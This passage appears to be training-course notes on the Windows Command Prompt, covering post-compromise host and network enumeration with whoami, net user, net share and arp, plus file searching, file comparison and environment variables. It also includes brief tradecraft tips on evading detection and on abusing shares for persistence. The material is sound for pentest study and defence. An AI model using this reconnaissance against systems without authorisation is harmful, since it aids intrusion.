| `Networking Information`     | Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: `host IP address`, `available network interfaces`, `accessible subnets`, `DNS server(s)`, `known hosts` and `network resources`. |
| `Basic Domain Information`   | Contains Active Directory information regarding the domain to which the target system is connected.                                                                                                                                                                                                                                                     |
| `User Information`           | Contains information regarding local users and groups on the target system. This can typically contain anything accessible to these accounts, such as `environment variables`, `currently running tasks`, `scheduled tasks` and known services.                                                                                                         |
Although this is not an exhaustive list of every single piece of information on a system, this will provide us with the means to begin creating a solid methodology for enumeration. 

Peering back at the diagram with our newfound knowledge, we can see a pattern emerge as to what we should be looking for while performing enumeration on our target host.

To keep ourselves on target during enumeration, we want to try and ask ourselves some of the the following questions:

- ***`What system information can we pull from our target host?`***
- ***`What other system(s) is our target host interacting with over the network?`***
- ***`What user account(s) do we have access to, and what information is accessible from the account(s)?`***

> Think of these questions as a way to provide structure to help us develop a sense of situational awareness and a methodology for testing.
> 
> Doing so gives us a clearer idea of what we are looking for and what information needs to be filtered out or prioritized during a real-life engagement. 
### Why Do We Need This Information?

> This section will provide more of the `why` behind gathering information in the first place and the importance of thorough enumeration of a target.

As stated beforehand, our `goal` with `host enumeration` here is to use the information gained from the target to provide us with a starting point and guide for how we wish to attack the system. To gain a better grasp on the concept behind the importance of proper host enumeration, let us follow along with the following example. 

---

**Example**: Imagine you are tasked with working on an `assumed breach` engagement and have been provided with initial access through what is assumed to be an unprivileged user account. Your task is to get an overall lay of the land and see if you can `escalate your privileges` beyond the initial access of the compromised user account. 

---

Following this example scenario, we can see that we are provided direct access to our initial host through an assumed unprivileged user account. However, our goal is to eventually escalate our privileges to an account with access to higher privileges or administrative permissions if we are lucky.

- To do this, we are going to need a thorough understanding of our environment, including the following:

	- **`What user account do we have access to?`**
	- **`What groups does our user belong to?`**
	- **`What current working set of privileges does our user have access to?`**
	- **`What resources can our user access over the network?`**
	- **`What tasks and services are running under our user account?**`

> Remember that this only partially encompasses all the questions we can ask ourselves to reach our intended goal but simply a tiny subset of possibilities. 

Without thinking things through and failing to follow any guided structure while performing `enumeration`, we will struggle to know if we have all the required information to reach our goal. 

It can be easy to write off a system as being completely patched and not vulnerable to any current CVEs or the latest vulnerabilities. 

- However, if you only focus on that aspect, it is easy to miss out on the many human configuration errors that could exist in the environment. 
- This very reason is why taking our time and gathering all of the information we can on a system or environment should be prioritized in terms of importance over simply exploiting a system haphazardly.
### How Do We Get This Information?

#### Casting a Wide Net

> CMD provides a one-stop shop for information via the `systeminfo` command.

It is excellent for finding relevant information about the host, such as:

- Hostname
- IP addresses
- Domain
- Hotfixes and patches installed
- Much more

*This information is super valuable for a sysadmin when trying to diagnose issues.*

> For a hacker, this is a great way to quickly get the lay of the land when you first access a host while leaving minimal footprint. 

Running one command is always better than running two or three just to get the same information.

We are less likely to be detected this way. Having quick access to things such as the OS version, hotfixes installed, and OS build version can help us quickly determine from a quick Google or [ExploitDB](https://www.exploit-db.com/) search, if an exploit exists that can be quickly leveraged to exploit this host further, elevate privileges and more.

#### Systeminfo Output

```cmd
C:\htb> systeminfo


Host Name:                 DESKTOP-htb
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free

<snipped>
```

> However, knowing a single way to gather information is inefficient, especially if specific commands are monitored and tracker more closely than others. 
> 
> 	This is why we need more than one established way to gather our required information and stay under the detection radar when possible.
#### Examining the System

> As shown previously, `systeminfo` contains a lot of information to sift through, however, if we need to retrieve some basic system information such as the `hostname` or `OS versions`, we can use the `hostname` and `ver` utilities built into the command prompt.

The [hostname](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname) utility follows its namesake and provides us with the hostname of the machine, whereas the [ver](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ver) command prints out the current operating system version number. 

Both commands, in tandem, will provide us with an alternative way to retrieve some basic system information we can use while further enumerating the target host.
#### Scoping the Network

In addition to the host information provided above, let us quickly look at some basic network information for our target. 

A thorough understanding of how our target is connected and what devices it can access across the network is an invaluable tool in our arsenal as an attacker.

> To gather this information quickly and in one simple-to-use command, Command Prompt offers the `ipconfig` utility. 
> The [ipconfig](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig) utility displays all current TCP/IP network configurations for the machine. Let us look at an example `ipconfig` configuration without providing additional parameters.
#### `ipconfig` without parameters

```cmd
C:\htb> ipconfig

Windows IP Configuration

<SNIP>

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : htb.local
   Link-local IPv6 Address . . . . . : fe80::2958:39a:df51:b60%23
   IPv4 Address. . . . . . . . . . . : 10.0.25.17
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.25.1

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : internal.htb.local
   Link-local IPv6 Address . . . . . : fe80::bc3b:6f9f:68d4:3ec5%26
   IPv4 Address. . . . . . . . . . . : 172.16.50.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.50.1

<SNIP>
```

> As we can see in the example above, even without specifying parameters, we are greeted with some basic network information for the host machine, such as:

- *Domain Name*
- *IPv4 Address*
- *Subnet Mask*
- *Default Gateway*

If we need additional information or want to dig further into the specific settings applied to each adapter, we can use the following command: `ipconfig /all`. As implied by the flag provided, this command provides *a fully comprehensive listing (full TCP/IP configuration) of every network adapter attached to the system and additional information, including:*

- The physical layer of each adapter (`MAC address`)
- DHCP Settings
- DNS Servers

`ipconfig` is a highly versatile command for gathering information about the network connectivity of the target host; however, if we need to quickly see what hosts our target has come into contact with, look no further than the `arp` command.

> The [arp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/arp) utility effectively displays the contents and entries contained within the Address Resolution Protocol (`ARP`) cache.

- We can use this command to modify the table entries effectively. However, that in itself is beyond the scope of this module. 
- To better understand what type of information the `ARP` cache contains, let us quickly look at the following example:
#### Utilizing ARP to Find Additional Hosts

```cmd
C:\htb> arp /a

<SNIP>

Interface: 10.0.25.17 --- 0x17
  Internet Address      Physical Address      Type
  10.0.25.1             00-e0-67-15-cf-43     dynamic
  10.0.25.5             54-9f-35-1c-3a-e2     dynamic
  10.0.25.10            00-0c-29-62-09-81     dynamic
  10.0.25.255           ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 172.16.50.15 --- 0x1a
  Internet Address      Physical Address      Type
  172.16.50.1           15-c0-6b-58-70-ed     dynamic
  172.16.50.20          80-e5-53-3c-72-30     dynamic
  172.16.50.32          fb-90-01-5c-1f-88     dynamic
  172.16.50.65          7a-49-56-10-3b-76     dynamic
  172.16.50.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static\

<SNIP>
```

> From this example, we can see all the hosts that have come into contact or might have had some prior communication with our target. We can use this information to begin mapping the network along each of the networking interfaces belonging to our target. 
#### Understanding Our Current User

> Now that we have some basic host information to get us started, we should further understand our current compromised user account. One of the best command line utilities to do so is `whoami`

[Whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami) allows us to display the user, group, and privilege information for the user that is currently logged in. In this case, we should run it without any parameters first and see what kind of output we end up with.

```cmd
C:\htb> whoami

ACADEMY-WIN11\htb-student
```

As we can see from the initial output above, running `whoami` without parameters provides us with the current domain and the user name of the logged-in account.

**Note:** If the current user is not a domain-joined account, the `NetBIOS` name will be provided instead. The current `hostname` will be used in most cases.
#### Checking Out Our Privileges

> As previously mentioned, we can also use `whoami` to view our current user's security privileges on the system.
> 
> By understanding what privileges are enabled for our current user, we can determine our capabilities on a target host. 

Let us try running `whoami /priv` from our compromised user account. 

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

> From the output above, we only seem to have access to a basic permission set, and most of our options are disabled. This falls within the limitations of a standard user account provisioned on the domain.

- However, if there were any misconfigurations in these settings or the user was provided any additional privileges, we could potentially use this to our advantage in trying to escalate the privileges of our current user.
#### Investigating Groups

> On top of having a thorough understanding of our current user's privileges, we should also take some time to see what groups our account is a member of. 
> This can provide insight into other groups our current user is a part of, including any default groups (built-ins) and, more importantly, any custom groups to which our user was explicitly granted access. To view the groups our current user is a part of, we can issue the following command: `whoami /groups`.

```cmd
C:\htb> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Our user is not a member of any other groups besides the built-ins added to our account upon creation. However, it is essential to note that in some cases, users can be provided additional access, and permissions based on the groups to which they belong.

---

**Note:** The commands shown above contain only certain sections of the output provided from `whoami /all`. Depending on the situation and the information that's needed, we can use the individual commands or gather all of the information at once through the use of the `/all` parameter.

---
#### Investigating Other Users/Groups

> After investigating our current compromised user account, we need to branch it out a bit and see if we can get access to other accounts. 
> 
> In most environments, machines on a network are domain-joined. 

Due to the nature of domain-joined networks, anyone can log in to any physical host on the network without requiring a local account on the machine. 

We can use this to our advantage by scoping out what users have accessed our current host to see if we could access other accounts. *This is very beneficial as a method of maintaining persistence across the network.* To do this, we can utilize specific functionality of the `net` command.
#### Net User

[Net User](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11)) allows us to display a list of all users on a host, information about a specific user, and to create or delete users.

```cmd
C:\htb> net user

User accounts for \\ACADEMY-WIN11

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
htb-student              WDAGUtilityAccount
The command completed successfully.
```

> From the provided output, only a few user accounts have been created for this machine. 
> 	However, if we were on a more populated network, we might come across more accounts to attempt a compromise.
#### Net Group/Localgroup

> In addition to user accounts, we should also take a quick look into what groups exist across the network. In the previous section, we discussed very heavily into groups that our user is a member of; however, we also have the capability from our current host to view all groups that exist on our host and from the domain.

We can achieve this by utilizing the `net group` and `net localgroup` commands.

[Net Group](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051(v=ws.11)) will display any groups that exist on the host from which we issued the command, create and delete groups, and add or remove users from groups.

-  It will also display domain group information if the host is joined to the domain. 
- Keep in mind, `net group` must be run against a domain server such as the DC, while `net localgroup` can be run against any host to show us the groups it contains.

```cmd
C:\htb> net group
net group
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.


C:\htb>net localgroup

Aliases for \\ACADEMY-WIN11

-------------------------------------------------------------------------------
*__vmware__
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
```
#### Exploring Resources on the Network

> Previously, we honed in on what our current user has access to in terms of the host locally. However, in a domain environment, users are typically required to store any work-related material on a share located on the network versus storing files locally on their machine.

These shares are usually found on a server away from the physical access of a run-of-the-mill employee. 

Typically, standard users will have the necessary permissions to read, write and execute files from a share, provided they have valid credentials. We can, of course, abuse this as an additional persistence method, but how do we locate these shares in the first place?
#### Net Share

>One way of doing so involves using the `net share` command. [Net Share](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh750728(v=ws.11)) allows us to display info about shared resources on the host and to create new shared resources as well.

```cmd
C:\htb> net share  

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Records      D:\Important-Files              Mounted share for records storage  
The command completed successfully.
```

> As we can see from the example above, we have a list of shares that our current compromised user has access to. By reading the remarks, we can take an educated guess that `Records` is a manually mounted share that could contain some potentially interesting information for us to enumerate. 

Ideally, if we were to find an open share like this while on an engagement, we would need to keep track of the following:

- *`Do we have proper permissions to access this share?*`
- `*Can we read, write and execute files on the share?*`
- `*Is there any valuable data on the share?`*

> In addition to providing information, `shares` are great for hosting anything we need and laterally moving across hosts as a pentester. If we are not too worried about being sneaky, we can drop a payload or other data onto a share to enable movement around other hosts on the network. Although outside of the scope of this module, abusing shares in this manner is an excellent persistence method and can potentially be used to escalate privileges.
#### Net View

> If we are not explicitly looking for shares and wish to search the environment broadly, we have an alternate command that can be extremely useful, also known as `net view`.

[Net View](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875576(v=ws.11)) will display to us any shared resources the host you are issuing the command against knows of. This includes domain resources, shares, printers, and more.

```cmd
C:\htb> net view  
```

### Piecing Things Together

> Using all the information and examples provided above, we have extracted a significant amount of information from our host and its' surroundings. 

From here, depending on our access, we can elevate our privileges or continue to move towards our goal. 

System-level access on every host is unnecessary for a pentester (unless the assessment calls for it), so let us avoid getting stuck trying to get it on every occasion. 

---

> This is just a quick look at how `CMD` can be used to gain access and continue an assessment with limited resources. Keep in mind that this route is quite noisy, and we will be noticed eventually by even a semi-competent blue team. 

As it stands, we are writing tons of logs, leaving traces across multiple hosts, and have little to no insight into what their `EDR` and `NIDS` was able to see.

---

**Note:** In a standard environment, cmd-prompt usage is not a common thing for a regular user. Administrators sometimes have a reason to use it but will be actively suspicious of any average user executing cmd.exe. With that in mind, using `net *` commands within an environment is not a normal thing either, and can be one way to alert on potential infiltration of a networked host easily. With proper monitoring and logging enabled, we should spot these actions quickly and use them to triage an incident before it gets too far out of hand.

---

### Final Thoughts and Considerations

Albeit this has been an incredibly long section, we should have a general sense of the overall scope of information that can be found on a system, why we need it, and how we can gather this information quickly and efficiently. 

As a pentester, having this mindset allows us to further our methodology and gain a thorough understanding of what exactly we are looking for while enumerating a system or its wider environment. 

- Having a solid methodology for enumeration is a highly invaluable skill for us to pick up early on.

> As we move on to further sections in this module, our mindset and methodology will remain the same as we will simply be building upon the foundation being laid. In the next section, we will dive further into finding specific files and directories on our system.
# Finding Files and Directories

> Now, we are comfortable creating, modifying, moving and deleting files and directories. We should cover a beneficial concept that can make or break it during an engagement or in our day-to-day tasks as a `Systems Admin` or `Penetration Tester`, known as `enumeration`.

This section will cover how to search for particular files and directories utilizing CMD, why enumerating system files and directories are vital, and provide an essential list of what to look out for while enumerating the system.
### Searching With CMD

#### Using Where

```cmd
C:\Users\student\Desktop>where calc.exe

C:\Windows\System32\calc.exe

C:\Users\student\Desktop>where bio.txt

INFO: Could not find files for the given pattern(s).
```

> Above, we can see two different tries using the `where` command. First, we searched for `calc.exe`, and it completed showing us the path for calc.exe.
> 	This command worked because the system32 folder is in our environment variable path, so the `where` command can look through those folders automatically. 

> The second attempt we see failed. This is because we're searching for *a file that does not exist within that environment path*. 
> 	It is located within our user directory. So, we need to specify that path to search in, and to ensure we dig through all directories within that path, we can use the `/R` switch.
#### Recursive Where

```cmd
C:\Users\student\Desktop>where /R C:\Users\student\ bio.txt

C:\Users\student\Downloads\bio.txt
```

> Above, we searched recursively, looking for bio.txt. 

The file was found in the `C:\Users\student\Downloads` folder. The `/R` switch *forced the `where` command to search through every folder in the student user directory hive.*

On top of looking for files, we can also search wildcards for specific strings, file types, and more. 

Below is an example of searching for the `csv` file type within the student directory.
#### Using Wildcards

```cmd
C:\Users\student\Desktop>where /R C:\Users\student\ *.csv

C:\Users\student\AppData\Local\live-hosts.csv
```

> We used `where` to give us an idea of how to search for files and applications on the host. Now, let us talk about `find`.

`Find` is used to search for *text strings* or their absence within a file or files. 

You can also use `find` against the console's output or another command. Where `find` is limited, however, is its capability to utilize wildcard patterns in it's matching. 

The example below will show us a simple search with `find` against the not-password.txt file.
#### Basic Find

```cmd
C:\Users\student\Desktop> find "password" "C:\Users\student\not-passwords.txt" 
```

> We can modify the way `find` searches using several switches.

- The `/V` modifier can change our search from a *matching clause* to a `Not` clause.
	- So, for example, if we use `/V` with the search string password against a file, it will show us any line that does not have the specified string.
- We can also use the `/N` switch to display line numbers for us and the `/I` display to ignore case sensitivity. 
	- In the example below, we use all of the modifiers to show us any lines that do not match the string `IP Address` while asking it to display line numbers and ignore the case of the string.
#### Find Modifiers

```cmd
C:\Users\student\Desktop> find /N /I /V "IP Address" example.txt  
```

> For quick searches, find is easy to use, but it could be more robust in how it can search. 
> 	However, if we need something more specific, `findstr` is what we need.

The `findstr` command is similar to `find` in that it searches through files but for patterns instead. 

It will look for anything matching a pattern, regex value, wildcards and more. 

- Think of it as *find2.0*. 
- For those familiar with Linux, `findstr` is closer to `grep`.
#### Findstr

```cmd-session
C:\Users\student\Desktop> findstr  
```
### Evaluating and Sorting Files

> We have seen how to work with, search for certain files and search for strings inside files. Additionally, we have also learned how to create and modify files.

Now let us discuss a few options to evaluate those files and compare them against each other. 

The [comp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/comp), [fc](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fc), and [sort](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sort) commands are how we will accomplish this.

- `Comp` will check each byte within two files looking for differences and then displays them where they start. 
	- By default, the differences are shown in a decimal format. 
- `/A` modifier can be used if we want to see the differences in ASCII format.
- The modifier `/L` can also provide us with the line numbers.
#### Compare

```cmd-session
C:\Users\student\Desktop> comp .\file-1.md .\file-2.md

Comparing .\file-1.md and .\file-2.md...
Files compare OK  
```

> Above, we see the comparison come back as OK. The files are the same.

We can use this as an easy way to check if any scripts, executables or critical files have been modified.

Below we have output from a file that's been changed.
#### Comparing Different Files

```powershell
PS C:\htb> echo a > .\file-1.md
PS C:\Users\MTanaka\Desktop> echo a > .\file-2.md
PS C:\Users\MTanaka\Desktop> comp .\file-1.md .\file-2.md /A
Comparing .\file-1.md and .\file-2.md...
Files compare OK
<SNIP>
PS C:\Users\MTanaka\Desktop> echo b > .\file-2.md
PS C:\Users\MTanaka\Desktop> comp .\file-1.md .\file-2.md /A
Comparing .\file-1.md and .\file-2.md...
Compare error at OFFSET 2
file1 = a
file2 = b  
```

> We used echo to ensure the strings differed and then reran the comparison. Notice how our output has changed, and using the /A modifier, we are seeing the character difference between the two files now.

`Comp` is a simple but effective tool. 

Now, let us look at `FC` for a minute. 

*`FC` differs in that it will show you which lines are different, not just an individual character `/A` or byte that is different on each line.* 

`FC` has quite a few more options than `comp` has, so be sure to look at the help output to ensure you are using it in the manner you want. 
#### FC Help

```cmd
C:\htb> fc.exe /?

Compares two files or sets of files and displays the differences between
them

FC [/A] [/C] [/L] [/LBn] [/N] [/OFF[LINE]] [/T] [/U] [/W] [/nnnn]
   [drive1:][path1]filename1 [drive2:][path2]filename2
FC /B [drive1:][path1]filename1 [drive2:][path2]filename2

  /A         Displays only first and last lines for each set of differences.
  /B         Performs a binary comparison.
  /C         Disregards the case of letters.
  /L         Compares files as ASCII text.
  /LBn       Sets the maximum consecutive mismatches to the specified
             number of lines.
  /N         Displays the line numbers on an ASCII comparison.
  /OFF[LINE] Do not skip files with offline attribute set.
  /T         Does not expand tabs to spaces.
  /U         Compare files as UNICODE text files.
  /W         Compresses white space (tabs and spaces) for comparison.
  /nnnn      Specifies the number of consecutive lines that must match
             after a mismatch.
  [drive1:][path1]filename1
             Specifies the first file or set of files to compare.
  [drive2:][path2]filename2
             Specifies the second file or set of files to compare.
```

> When `FC` performs its inspection, it is case-sensitive and cares more than just a byte-for-byte comparison. Below, we will use a few lines with many more characters and string to test its functionality. 

We will perform a basic check and have it print the line numbers and the ASCII comparison using the `/N` modifier.
#### FC

```cmd
C:\Users\student\Desktop> fc passwords.txt modded.txt /N

Comparing files passwords.txt and MODDED.TXT
***** passwords.txt
    1:  123456
    2:  password
***** MODDED.TXT
    1:  123456
    2:
    3:  password
*****

***** passwords.txt
    5:  12345
    6:  qwerty
***** MODDED.TXT
    6:  12345
    7:  Just something extra to show functionality. Did it see the space inserted above?
    8:  qwerty
*****
```

> The output from FC is much easier to interpret and gives us a bit more clarity about the differences between the files.

When comparing files such as text files, spreadsheets or lists, it is prudent to sort them first to ensure the data on each string is the same. 

Otherwise, every line will be different, and our comparison will not help. Let us look at `sort` now to help us with that.

With `Sort`, we can receive input from the console, pipeline or a file, sort it and send the results to the console or into a file or other commad.

- It is relatively simple to use and often will be used in conjunction with pipeline operators such as `|`, `<` and `>`. 
- We can give it a try now by feeding the contents of the `file` to sort. 
#### Sort

```cmd
C:\Users\student\Desktop> type .\file-1.md
a
b
d
h
w
a
q
h
g

C:\Users\MTanaka\Desktop> sort.exe .\file-1.md /O .\sort-1.md
C:\Users\MTanaka\Desktop> type .\sort-1.md

a
a
b
d
g
h
h
q
w
```

> As we can see above, using `sort` on the file `file-1.md` and then sending the result with the `/0` modifier to the file sort-1.md, we took our list of letters, sorted them in alphabetical order, and wrote them to the new file. 

It can get more complex when working with *larger datasets*, but the basic usage is still the same. If we wanted `sort` only to return unique entries, we could also use the `/unique` modifier. Notice the first two entries in the `sort-1.md` file. Let us try using unique and see what happens.
#### `unique`

```cmd
C:\htb> type .\sort-1.md

a
a
b
d
g
h
h
q
w

PS C:\Users\MTanaka\Desktop> sort.exe .\sort-1.md /unique

a
b
d
g
h
q
w  
```

> Notice how we have fewer overall results now. This is because `sort` did not duplicate entries from the file to the console.

Finding files and directories, sorting datasets, and comparing files are all essential skills we should have in our arsenal. Next, we will discuss Environment variables and what they provide us as a cmd-prompt user.
# Environment Variables

> Now that we have our feet under us when it comes to the Command Prompt let us discuss one of the more critical topics when thinking about how applications and scripting work in Windows, `Environment Variables`. 

In this section, we will discuss what they are, their uses, and how we can manage the variables in our system.
### What an Environment Variable Is

> Environment variables are settings that are often applied globally to our hosts. 

They can be found on Windows, Linux and macOS hosts. This concept is not specific to one OS type, but they function differently on each OS. Environment variables can be accessed by most users and applications on the host and are used to run scripts and speed up how applications function and reference data.

On a Windows host, environment variables are `not` case sensitive and can have spaces and numbers in the name. 

The only real catch we will find is that they cannot have a name that starts with a number or include an equal sign. 

When referenced, we will see these variables called like so:

```cmd
%SUPER_IMPORTANT_VARIABLE%
```

It is normal to see these variables (especially already built into the system) displayed in uppercase letters and utilizing an underscore to link any words in the name. Before moving on, we should mention one crucial concept regarding environment variables known as `Scope.`
#### Variable Scope

> In this context, `Scope` is a programming concept that refers to where variables can be accessed or referenced. 'Scope' can be broadly separated into two categories:

- **Global**:
	- Global variables are accessible `globally`. In this context, the global scope lets us know that we can access and reference the data stored inside the variable from anywhere within a program.
- **Local**:
	- Local variables are only accessible within a `local` context. `Local` means that the data stored within these variables can only be accessed and referenced within the function or context in which it has been declared.

Let us walk through an example scenario together to understand the differences better. In this scenario, we have two users, `Alice` and `Bob`. Both users have a default command prompt session and are logged in concurrently to the same machine.

Additionally, both users issue a command to print out the data stored within the `%WINDIR%` variable, as seen in the examples below.
#### Showcasing Global Variables

##### Example 1:

```cmd-session
C:\Users\alice> echo %WINDIR%

C:\Windows
```

##### Example 2:

```cmd-session
C:\Users\bob> echo %WINDIR%

C:\Windows
```

> We can see that this variable is accessible to both users. As such, both users can display the data stored within it. This is because the `%WINDIR%` variable is a `global variable` as ***defined by the Windows OS***. 

- However, what if Alice wanted to create a secret variable that Bob could not view or access; how would she go about doing so?
#### Showcasing Local Variables

##### Example 1:

```cmd-session
C:\Users\alice> set SECRET=HTB{5UP3r_53Cr37_V4r14813}

C:\Users\alice> echo %SECRET%
HTB{5UP3r_53Cr37_V4r14813}
```

##### Example 2:

```cmd-session
C:\Users\bob> echo %SECRET%
%SECRET%

C:\Users\bob> set %SECRET%
Environment variable %SECRET% not defined
```

> In the first example, Alice cretes a variable called `SECRET` and stores the value `HTB{5UP3r_53Cr37_V4r14813}` inside it. 
> 
> 	After setting the value of the variable, Alice then retrieves it using the command `echo` to print out the value stored within. 

However, when Bob attempts to retrieve the same variable, he cannot, as it is not defined in his current environment. 

What Alice created was a `local variable` that only she could access as it was only defined in the context of her local environment.

*Note: This explanation of global vs. local scope is in no way a fully comprehensive guide to the differences between them and will not include more advanced concepts. This section is to provide the necessary background information moving forward.*

Now that we have a basic understanding of variables and a general idea of the basics behind defined `scopes`, let us dig into how Windows interacts and stores environment variables and how we can interact with them. 

Like before, Windows, like any other program, contains its own set of variables known as `Environment Variables`.

**`Environment Variables`** can be separated into their defined scopes known as `System` and `User` scopes. 

- Additionally, there is one more defined scope known as the `Process` scope; however, it is volatile by nature and is considered to be a sub-scope of both the `System` and `User` scopes.

Keeping this in mind, let's explore their differences and intended functionalities:

| Scope              | Description                                                                                                                                                                                                                                                                                                                                                                                       | Permissions Required to Access                                   | Registry Location                                                         |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------------------- |
| `System (Machine)` | The System scope contains environment variables defined by the operating system (OS) and are accessible globally by all accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime.                                                                                                                                                     | Local Administrator or Domain Administrator                      | `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Session Manager\Environment` |
| `User`             | The User scope contains environment variables defined by the current active user and are only accessible to them, not other users who can log onto the same machine.                                                                                                                                                                                                                              | Current Active User, Local Administrator or Domain Administrator | `HKEY_CURRENT_USER\Environment`                                           |
| `Process`          | The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process). | Current Child Process, Parent Process, or Current Active User    | `None (Stored in Process Memory)`                                         |
> The table should provide good overall coverage of how Windows deals with environment variables and how only certain users can access certain variables due to permissions. 
> 
> 	Now that we understand these differences, let us begin attempting to make specific changes to environment variables ourselves.
### Using Set and Echo to View Variables

To understand the changes to environment variables taking place, we need some way to view their contents via the command prompt. 

Thankfully, we have a couple of choices available to us: `set` and `echo`.
#### Display with Set

```cmd
C:\Users\htb\Desktop>set %SYSTEMROOT%

Environment variable C:\Windows not defined
```

> Upon opening the command prompt, you can issue the command `set` to print all environment variables on the system.

Alternatively, you can enter the same command again with the variable's name without setting it equal to anything to print the value of a specific variable.

- We see that in this case, it mentions the value itself is not defined; however, this is because we are not defining the value of `%SYSTEMROOT%` using `set` in this example. 
#### Display with Echo

```cmd
C:\Users\htb\>echo %PATH%

C:\Users\htb\Desktop
```

> Similar to the example above, you can use `echo` to display the value of an environment variable.
> 
> 	Unlike the previous command, `echo` is used to print the value contained within the variable and has no additional built-in features to edit environment variables.

In the next section, we will discuss how we create new variables, remove unneeded ones, and edit existing ones using the command prompt.
### Managing Environment Variables

> Now that we have some way to view existing environment variables on our system, we need to be able to create, remove and manage them from the comfort and safety of our prompt. 

We have two methods available to us to do so. 

We can use the `set` or `setx` to perform our intended actions.
#### When to Use `set` vs. `setx`

> Both [set](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set_1) and [setx](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setx) are command line utilities that allow us to display, set and remove environment variables. The difference lies in how they achieve those goals. 

The `set` utility only manipulates environment variables in the current command line session. This means that once we close our current session, any additions, removals or changes will not be reflected the next time we open a command prompt. 

Suppose we need to make permanent changes to environment variables. In that case, we can use `setx` to make the appropriate changes to the registry, which will exist upon restart of our current command prompt session.

**Note:** Using `setx`, we also have some additional functionality added in, such as being able to create and tweak variables across computers in the domain as well as our local machine.

We should now be familiar with some of the primary differences between both commands discussed above. 

> There will be times and situations when one should be prioritized over the other. **As an attacker, there will be times when we will need to enumerate existing environment variables for information. Let us move on and create some actual variables we can use.**
#### Creating Variables

> Creating environment variables is quite a simple task. We can use either `set` or `setx` depending on the task at hand and our overall goal. 

The following example will show both being put into action to give us a feel for the syntax surrounding either command. The following examples will show both being put into action to give us a feel for the syntax surrounding either command. 

Please note that the syntax between both in some cases is very similar; however, `setx` does have some additional features that we will attempt to explore here. 

Additionally, to ensure things are not getting too repetitive, we will only show both the `set` and `setx` commands for creating variable sand utilizing `setx` for every other example. 

- Just know that the syntax between *creating, removing and editing environment variables is identical.* 

